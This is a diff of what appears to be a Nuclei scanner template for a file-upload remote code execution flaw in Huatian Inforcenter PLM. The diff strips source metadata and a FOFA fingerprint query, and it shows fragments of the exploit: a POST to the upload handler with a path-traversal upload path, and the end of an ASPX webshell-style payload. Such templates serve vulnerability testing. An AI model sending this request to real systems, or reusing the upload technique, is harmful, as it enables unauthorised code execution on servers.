@@ -3,12 +3,8 @@ info:
   name: 华天软件Inforcenter PLM uploadFileToIIS 文件上传致RCE漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/dblgobtf7dbv9im3'
+  description: ''
   tags: rce,file-upload,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: dblgobtf7dbv9im3
-    fofa: body="/Base/BaseHandler.ashx"
 http:
 - raw:
   - 'POST /Base/BaseHandler.ashx?type=uploadFileToIIS&uploadPath=../Files/ HTTP/1.1
@@ -65,9 +61,7 @@ http:
 
     Response.End();%>
 
-    ------WebKitFormBoundaryFfJZ4PlAZBixjELj--
-
-    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1753498942824-7ab87d7a-1dec-4e30-88b3-438c5b74a9a3.png)'
+    ------WebKitFormBoundaryFfJZ4PlAZBixjELj--'
   redirects: false
   matchers:
   - status:
